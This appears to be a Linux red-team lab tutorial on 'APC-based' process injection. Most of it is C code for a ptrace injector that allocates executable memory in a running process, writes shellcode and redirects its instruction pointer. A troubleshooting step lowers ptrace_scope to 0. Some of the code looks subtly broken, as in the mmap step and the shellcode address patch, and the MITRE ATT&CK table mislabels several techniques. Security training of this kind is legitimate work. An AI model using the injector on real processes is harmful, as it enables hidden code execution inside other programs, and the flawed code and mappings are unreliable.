<div align="center">

# 🔧 APC-Based Process Injection

![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![C](https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white)
![ptrace](https://img.shields.io/badge/ptrace-Advanced-red?style=for-the-badge)
![Process Injection](https://img.shields.io/badge/Process%20Injection-Technique-orange?style=for-the-badge)
![Red Team](https://img.shields.io/badge/Red%20Team-Ops-darkred?style=for-the-badge)
![Al Nafi](https://img.shields.io/badge/Al%20Nafi-Training-blue?style=for-the-badge)

**Master asynchronous procedure call injection techniques on Linux and execute arbitrary code within target processes**

[Objectives](#-objectives) • [Prerequisites](#-prerequisites) • [Tasks](#-tasks) • [Verification](#-verification) • [Key Takeaways](#-key-takeaways)

</div>

---

## 📋 Table of Contents

1. [Objectives](#-objectives)
2. [Prerequisites](#-prerequisites)
3. [Lab Environment](#-lab-environment)
4. [Task 1: Development Environment Setup](#-task-1-development-environment-setup)
5. [Task 2: APC Injection Framework](#-task-2-apc-injection-framework)
6. [Task 3: Testing & Payload Execution](#-task-3-testing--payload-execution)
7. [Verification & Analysis](#-verification--analysis)
8. [Troubleshooting](#-troubleshooting)
9. [Key Takeaways](#-key-takeaways)
10. [MITRE ATT&CK Mapping](#-mitre-attck-mapping)

---

## 🎯 Objectives

| # | Objective | Status |
|---|-----------|--------|
| 1️⃣ | Understand APC-based process injection techniques | ☐ |
| 2️⃣ | Implement APC injection using open-source tools on Linux | ☐ |
| 3️⃣ | Queue APCs in target processes for payload execution | ☐ |
| 4️⃣ | Test injection mechanisms with practical examples | ☐ |
| 5️⃣ | Analyze injection behavior using system monitoring tools | ☐ |

---

## ✅ Prerequisites

| Prerequisite | Level | Details |
|--------------|-------|---------|
| 🐧 Linux Process Management | Intermediate | Understanding of PID, signals, and process lifecycle |
| 🖥️ C Programming | Intermediate | Compilation, pointers, memory management |
| 🔧 System Calls | Intermediate | Knowledge of syscalls, ptrace, mmap fundamentals |
| 📚 Shared Libraries | Beginner | Basic understanding of dynamic linking concepts |
| 🛠️ GCC & Debugging Tools | Beginner | Familiarity with gcc, gdb, and compilation flags |

---

## 🏗️ Lab Environment

<div align="center">

**Al Nafi provides Linux-based cloud machines for this lab**

</div>

- ✨ Dedicated bare-metal Linux environment
- 🔑 Root access for privileged operations
- 🚀 Click **Start Lab** to begin your session
- ⚙️ All tools installed during the lab walkthrough

---

## 🚀 Task 1: Development Environment Setup

### 🔹 Subtask 1.1: Install Required Tools

<span style="background-color: #4CAF50; color: white; padding: 3px 8px; border-radius: 3px;">**ESSENTIAL**</span>

Install core development tools and system utilities:

```bash
# 📦 Update package manager
sudo apt update

# 💻 Install development tools
sudo apt install -y gcc gdb make libc6-dev

# 🔍 Install process utilities
sudo apt install -y procps htop strace

# ✔️ Verify installations
gcc --version
gdb --version
```

**Expected Output:**
```
gcc (Ubuntu 11.x.x-...) 11.x.x
GNU gdb (Ubuntu ...) x.x
```

---

### 🔹 Subtask 1.2: Create Working Directory

<span style="background-color: #2196F3; color: white; padding: 3px 8px; border-radius: 3px;">**SETUP**</span>

Organize your lab workspace:

```bash
# 📁 Create lab directory structure
mkdir ~/apc_injection_lab
cd ~/apc_injection_lab

# 🗂️ Create subdirectories for organization
mkdir src payloads target_processes

# ✅ Verify directory structure
tree . 2>/dev/null || find . -type d
```

**Directory Structure:**
```
apc_injection_lab/
├── src/                    # Source code files
├── payloads/              # Payload binaries
└── target_processes/      # Target executables
```

---

## 🔬 Task 2: APC Injection Framework

### 🔹 Subtask 2.1: Create Target Process

<span style="background-color: #FF9800; color: white; padding: 3px 8px; border-radius: 3px;">**VICTIM PROCESS**</span>

Create a simple application that will receive the APC injection:

```bash
cat > src/target_process.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>

volatile int running = 1;

void signal_handler(int sig) {
    printf("[TARGET] Received signal %d\n", sig);
    running = 0;
}

int main() {
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    
    printf("[TARGET] Process started with PID: %d\n", getpid());
    printf("[TARGET] Waiting for APC injection...\n");
    
    while(running) {
        sleep(1);
        printf("[TARGET] Still running...\n");
    }
    
    printf("[TARGET] Process terminating\n");
    return 0;
}
EOF
```

**🎯 What This Does:**
- ⏳ Creates an infinite loop waiting for signals
- 📢 Prints PID for easy identification
- 🛡️ Handles graceful shutdown via signals
- 📍 **TODO:** Modify to add custom signal handlers for injection detection

---

### 🔹 Subtask 2.2: Create APC Injection Framework

<span style="background-color: #9C27B0; color: white; padding: 3px 8px; border-radius: 3px;">**INJECTOR CORE**</span>

Implement the core APC injection mechanism:

```bash
cat > src/apc_injector.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <signal.h>
#include <errno.h>
#include <dlfcn.h>

#define PAYLOAD_SIZE 4096

// 🔴 Simple payload that prints a message
unsigned char payload_code[] = {
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  // mov rax, 1 (sys_write)
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,  // mov rdi, 1 (stdout)
    0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,  // mov rsi, message (placeholder)
    0x48, 0xc7, 0xc2, 0x1a, 0x00, 0x00, 0x00,  // mov rdx, 26 (message length)
    0x0f, 0x05,                                  // syscall
    0xc3                                         // ret
};

char message[] = "[INJECTED] APC executed!\n";

int inject_apc(pid_t target_pid) {
    struct user_regs_struct regs, backup_regs;
    void *remote_payload;
    void *remote_message;
    long ret;
    
    printf("[INJECTOR] Attaching to process %d\n", target_pid);
    
    // 🔗 Attach to target process
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("ptrace attach failed");
        return -1;
    }
    
    // ⏸️ Wait for process to stop
    int status;
    waitpid(target_pid, &status, 0);
    
    // 📖 Get current registers
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) == -1) {
        perror("ptrace getregs failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    // 💾 Backup registers for restoration
    backup_regs = regs;
    
    printf("[INJECTOR] Allocating memory in target process\n");
    
    // 🧠 Allocate memory for payload using mmap syscall
    regs.rax = 9;  // sys_mmap
    regs.rdi = 0;  // addr
    regs.rsi = PAYLOAD_SIZE;  // length
    regs.rdx = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
    regs.r10 = MAP_PRIVATE | MAP_ANONYMOUS;  // flags
    regs.r8 = -1;  // fd
    regs.r9 = 0;   // offset
    
    // 🔧 Set registers and execute syscall
    if (ptrace(PTRACE_SETREGS, target_pid, NULL, &regs) == -1) {
        perror("ptrace setregs failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    // ⚡ Execute syscall
    if (ptrace(PTRACE_SINGLESTEP, target_pid, NULL, NULL) == -1) {
        perror("ptrace singlestep failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    waitpid(target_pid, &status, 0);
    
    // 📊 Get result
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) == -1) {
        perror("ptrace getregs failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    remote_payload = (void *)regs.rax;
    if (remote_payload == MAP_FAILED) {
        printf("[INJECTOR] Memory allocation failed\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    printf("[INJECTOR] Allocated memory at: %p\n", remote_payload);
    
    // ✍️ Write message to allocated memory
    remote_message = remote_payload + sizeof(payload_code);
    for (int i = 0; i < strlen(message); i++) {
        long data = ptrace(PTRACE_PEEKDATA, target_pid, remote_message + i, NULL);
        data = (data & ~0xff) | message[i];
        ptrace(PTRACE_POKEDATA, target_pid, remote_message + i, data);
    }
    
    // 🎯 Update payload with message address
    *(void **)(payload_code + 16) = remote_message;
    
    // 📝 Write payload to allocated memory
    for (int i = 0; i < sizeof(payload_code); i += sizeof(long)) {
        long data = *(long *)(payload_code + i);
        ptrace(PTRACE_POKEDATA, target_pid, remote_payload + i, data);
    }
    
    printf("[INJECTOR] Payload written to target process\n");
    
    // 🔄 Restore original registers but set RIP to payload
    backup_regs.rip = (unsigned long long)remote_payload;
    
    if (ptrace(PTRACE_SETREGS, target_pid, NULL, &backup_regs) == -1) {
        perror("ptrace setregs failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    printf("[INJECTOR] Executing payload via APC simulation\n");
    
    // ▶️ Continue execution
    if (ptrace(PTRACE_CONT, target_pid, NULL, NULL) == -1) {
        perror("ptrace cont failed");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }
    
    // ⏱️ Wait for execution to complete
    sleep(2);
    
    // 🔌 Detach from process
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    
    printf("[INJECTOR] APC injection completed\n");
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <target_pid>\n", argv[0]);
        return 1;
    }
    
    pid_t target_pid = atoi(argv[1]);
    
    printf("[INJECTOR] Starting APC-based process injection\n");
    printf("[INJECTOR] Target PID: %d\n", target_pid);
    
    if (inject_apc(target_pid) == 0) {
        printf("[INJECTOR] Injection successful\n");
    } else {
        printf("[INJECTOR] Injection failed\n");
        return 1;
    }
    
    return 0;
}
EOF
```

**🔑 Key Components:**
- 🔗 `PTRACE_ATTACH` - Attach to target process
- 🧠 `sys_mmap` - Allocate executable memory
- 📝 `PTRACE_POKEDATA` - Write shellcode to remote memory
- 🎯 `RIP register` - Control execution flow
- 🔄 Register manipulation - Execute payload in target context

---

### 🔹 Subtask 2.3: Compile the Programs

<span style="background-color: #F44336; color: white; padding: 3px 8px; border-radius: 3px;">**BUILD**</span>

Compile both the target and injector programs:

```bash
# 🔨 Compile target process
gcc -o target_processes/target_process src/target_process.c

# 🔨 Compile APC injector
gcc -o src/apc_injector src/apc_injector.c

# ✅ Verify compilation success
ls -lah target_processes/target_process src/apc_injector
file target_processes/target_process src/apc_injector
```

**Expected Output:**
```
-rwxr-xr-x 1 user user 16K Jul  5 12:00 target_processes/target_process
-rwxr-xr-x 1 user user 20K Jul  5 12:00 src/apc_injector
```

---

## 🧪 Task 3: Testing & Payload Execution

### 🔹 Subtask 3.1: Run Target Process

<span style="background-color: #4CAF50; color: white; padding: 3px 8px; border-radius: 3px;">**LAUNCH**</span>

Start the victim process in background:

```bash
# 📂 Navigate to lab directory
cd ~/apc_injection_lab

# 🚀 Launch target process in background
./target_processes/target_process &
TARGET_PID=$!

# 📍 Display target PID
echo "🎯 Target process PID: $TARGET_PID"

# 📊 Verify process is running
ps aux | grep target_process | grep -v grep
```

**💡 Tips:**
- ✍️ **TODO:** Record the PID for next steps
- 🔍 Monitor output for "Waiting for APC injection..." message
- 🛑 Keep this terminal open or note the PID

---

### 🔹 Subtask 3.2: Execute APC Injection

<span style="background-color: #FF5722; color: white; padding: 3px 8px; border-radius: 3px;">**ATTACK**</span>

Perform the actual injection in a separate terminal:

```bash
# 🔓 Run injection with elevated privileges
sudo ./src/apc_injector $TARGET_PID

# 📈 Monitor injection output
ps aux | grep -E "(target_process|apc_injector)" | grep -v grep

# ⏱️ Check system logs for activity
dmesg | tail -5
```

**Expected Output:**
```
[INJECTOR] Starting APC-based process injection
[INJECTOR] Target PID: XXXX
[INJECTOR] Attaching to process XXXX
[INJECTOR] Allocating memory in target process
[INJECTOR] Payload written to target process
[INJECTOR] Executing payload via APC simulation
[INJECTOR] APC injection completed
[TARGET] [INJECTED] APC executed!
```

---

### 🔹 Subtask 3.3: Create Advanced Payload

<span style="background-color: #673AB7; color: white; padding: 3px 8px; border-radius: 3px;">**ADVANCED**</span>

Develop a sophisticated payload with file creation:

```bash
cat > src/advanced_payload.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <fcntl.h>

// 🎯 Payload function to be injected
void injected_payload() {
    // 📝 Write message using direct syscall
    const char msg[] = "[ADVANCED] APC payload executed successfully!\n";
    syscall(SYS_write, 1, msg, sizeof(msg) - 1);
    
    // 📄 Create proof file
    int fd = syscall(SYS_openat, AT_FDCWD, "/tmp/apc_proof.txt", 
                     O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char proof[] = "APC injection successful\n";
        syscall(SYS_write, fd, proof, sizeof(proof) - 1);
        syscall(SYS_close, fd);
    }
}

int main() {
    injected_payload();
    return 0;
}
EOF

# 🔨 Compile to object file
gcc -c src/advanced_payload.c -o payloads/advanced_payload.o

# 🔍 Extract and analyze shellcode
objdump -d payloads/advanced_payload.o | grep -A 50 "injected_payload>:"
```

**📊 Analysis Points:**
- 🔴 Identify syscall numbers in disassembly
- 📍 Note RIP register values
- ✍️ **TODO:** Modify syscalls to create different artifacts

---

### 🔹 Subtask 3.4: Verify Injection Results

<span style="background-color: #00BCD4; color: white; padding: 3px 8px; border-radius: 3px;">**VERIFY**</span>

Confirm successful injection and payload execution:

```bash
# 📄 Check if proof file was created
ls -lah /tmp/apc_proof.txt

# 📖 Display proof file contents
cat /tmp/apc_proof.txt

# 📋 Monitor system logs
dmesg | tail -10

# 🔍 Check process status and memory
ps aux | grep target_process
cat /proc/$TARGET_PID/maps | head -10
```

**Success Indicators:**
- ✅ `/tmp/apc_proof.txt` exists with correct content
- ✅ Target process still running after injection
- ✅ Injector completed without errors
- ✅ dmesg shows no critical errors

---

### 🔹 Subtask 3.5: Multiple Injection Tests

<span style="background-color: #E91E63; color: white; padding: 3px 8px; border-radius: 3px;">**STRESS TEST**</span>

Test injection mechanism reliability with multiple attempts:

```bash
# 🛑 Kill existing target process
kill $TARGET_PID 2>/dev/null
sleep 1

# 🆕 Start new target for multiple injection test
./target_processes/target_process &
NEW_TARGET_PID=$!
echo "🎯 New target PID: $NEW_TARGET_PID"

# 🔄 Perform multiple sequential injections
for i in {1..3}; do
    echo "🔂 Injection attempt $i"
    sudo ./src/apc_injector $NEW_TARGET_PID
    sleep 2
    echo "✅ Attempt $i completed"
done

# 🧹 Clean up test artifacts
kill $NEW_TARGET_PID 2>/dev/null
rm -f /tmp/apc_proof.txt
echo "🧹 Cleanup completed"
```

**📊 Results to Record:**
- ✍️ **TODO:** Document success/failure rate
- ✍️ **TODO:** Note timing between injections
- ✍️ **TODO:** Analyze process stability

---

## 🔎 Verification & Analysis

### 🔹 Monitor Injection Process with Tracing

<span style="background-color: #1976D2; color: white; padding: 3px 8px; border-radius: 3px;">**MONITOR**</span>

Create a comprehensive monitoring script:

```bash
cat > src/monitor_injection.sh << 'EOF'
#!/bin/bash

echo "🚀 Starting injection monitoring..."

# 📂 Navigate to lab directory
cd ~/apc_injection_lab

# 🎯 Start target process
./target_processes/target_process &
TARGET_PID=$!
echo "📍 Target PID: $TARGET_PID"

# 🔍 Monitor with strace in background
strace -p $TARGET_PID -o injection_trace.log &
STRACE_PID=$!

# ⏳ Wait for strace to attach
sleep 2

# 💉 Perform injection
echo "💉 Executing APC injection..."
sudo ./src/apc_injector $TARGET_PID

# ⏱️ Wait for completion
sleep 3

# 🛑 Stop monitoring
kill $STRACE_PID 2>/dev/null
kill $TARGET_PID 2>/dev/null

# 📊 Analyze results
echo "📊 Injection trace analysis:"
grep -E "(mmap|ptrace|write)" injection_trace.log | head -10

# 🔍 Show detailed syscall sequence
echo ""
echo "🔍 Detailed syscall sequence:"
grep -E "mmap|ptrace|write|exit" injection_trace.log
EOF

# 🔧 Make script executable
chmod +x src/monitor_injection.sh

# ▶️ Run monitoring script
./src/monitor_injection.sh
```

**📈 Key Metrics to Observe:**
- 📍 Number of ptrace syscalls
- 🧠 Memory allocation size and address
- ⏱️ Total execution time
- 📊 Process state transitions

---

## 🛠️ Troubleshooting

<details>
<summary><b>❌ ptrace: Operation not permitted</b></summary>

**Problem:** Permission denied when attaching with ptrace

**Solutions:**

```bash
# 🔍 Check ptrace scope setting
cat /proc/sys/kernel/yama/ptrace_scope

# 🔓 Temporarily allow ptrace (if scope is restricted)
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope

# ✅ Verify change
cat /proc/sys/kernel/yama/ptrace_scope

# 💡 Note: Scope levels:
# 0 = No restrictions
# 1 = Only parent can ptrace (default)
# 2 = Only admin can ptrace
# 3 = No ptrace allowed
```

</details>

<details>
<summary><b>❌ Memory allocation failed (mmap returned -1)</b></summary>

**Problem:** Unable to allocate memory in target process

**Solutions:**

```bash
# 🧠 Check available memory
free -h
df -h

# 📊 Monitor memory during injection
watch -n 1 'ps aux | grep -E "(target_process|apc_injector)"'

# 🔧 Reduce PAYLOAD_SIZE in apc_injector.c if needed
# #define PAYLOAD_SIZE 2048

# 🔄 Recompile after modification
gcc -o src/apc_injector src/apc_injector.c
```

</details>

<details>
<summary><b>❌ Target process crashed during injection</b></summary>

**Problem:** Segmentation fault or process termination

**Solutions:**

```bash
# 🔍 Check core dumps
dmesg | grep -i segfault

# 🐛 Use GDB to trace execution
gdb -p $TARGET_PID
(gdb) bt
(gdb) quit

# 🔧 Add debugging output to apc_injector.c
printf("[DEBUG] RIP before injection: 0x%llx\n", backup_regs.rip);
printf("[DEBUG] RIP after injection: 0x%llx\n", remote_payload);

# ✅ Verify register values before/after modification
```

</details>

<details>
<summary><b>❌ Compilation errors (gcc: command not found)</b></summary>

**Problem:** Development tools not installed

**Solutions:**

```bash
# 📦 Update package lists
sudo apt update

# 💻 Install build essentials
sudo apt install -y build-essential

# 🔧 Install individual tools if needed
sudo apt install -y gcc gdb make libc6-dev

# ✅ Verify installation
gcc --version
gdb --version
```

</details>

<details>
<summary><b>⚠️ Injection succeeds but payload doesn't execute</b></summary>

**Problem:** No output or proof file after injection

**Solutions:**

```bash
# 🔍 Verify payload in memory using gdb
sudo gdb -p $TARGET_PID
(gdb) x/20i $rip
(gdb) x/20bx <payload_address>

# 📊 Check stderr output (may be separate)
./target_processes/target_process 2>&1 | tee target.log

# 🔧 Modify payload to use different output method
# Try writing to stderr instead of stdout
# Change file descriptor from 1 to 2

# ✅ Add verbose logging
printf("[INJECTOR] Payload bytes written: %d\n", sizeof(payload_code));
printf("[INJECTOR] Message address: %p\n", remote_message);
```

</details>

---

## 🎓 Key Takeaways

| Concept | Learning Point | Application |
|---------|-----------------|-------------|
| 🔗 **ptrace System** | Powerful debugging interface for process control | Malware analysis, security research, anti-cheating |
| 🧠 **Memory Management** | Remote memory allocation and manipulation | Exploitation development, payload delivery |
| 📝 **Register Manipulation** | Control CPU state in target process | Code injection, privilege escalation |
| 🎯 **Injection Techniques** | APC-like execution in target context | Stealth malware, persistence mechanisms |
| ⚡ **Syscall Execution** | Direct syscalls in injected code | Fileless malware, anti-forensics |
| 🔍 **System Monitoring** | Tracing injection activity | Detection, analysis, defense |
| 🛡️ **Process Isolation** | Understanding process boundaries | Security design, sandboxing |

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | Procedure | Detection |
|--------|-----------|-----------|-----------|
| **Execution** | [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | DLL Injection | Monitor process access patterns |
| **Execution** | [T1134.001](https://attack.mitre.org/techniques/T1134/001/) | DLL Injection via ptrace | Watch for ptrace syscalls |
| **Defense Evasion** | [T1036](https://attack.mitre.org/techniques/T1036/) | Masquerading | Analyze process relationships |
| **Persistence** | [T1547](https://attack.mitre.org/techniques/T1547/) | Boot or Logon Initialization | Monitor process creation events |
| **Privilege Escalation** | [T1548](https://attack.mitre.org/techniques/T1548/) | Abuse Elevation Control | Check ptrace_scope settings |

**Detection Methods:**
- 🔍 Monitor `/proc/*/fd` for unusual file descriptors
- 📊 Track ptrace syscalls via auditd
- 🔔 Alert on memory allocation patterns (mmap + PROT_EXEC)
- 📈 Baseline normal process relationships

---

<div align="center">

## 📚 Al Nafi Cybersecurity Training Platform

**Master offensive and defensive security techniques through hands-on labs**

![Progress](https://img.shields.io/badge/Progress-Lab%20Complete-brightgreen?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange?style=flat-square)
![Time](https://img.shields.io/badge/Estimated%20Time-90%20minutes-blue?style=flat-square)

**Next Steps:** Explore advanced injection techniques including UAF-based injection, signal handler hijacking, and VDSO manipulation

---

*Last Updated: July 2024 | Version: 1.0 | Certification: Al Nafi Red Team Ops*

</div>
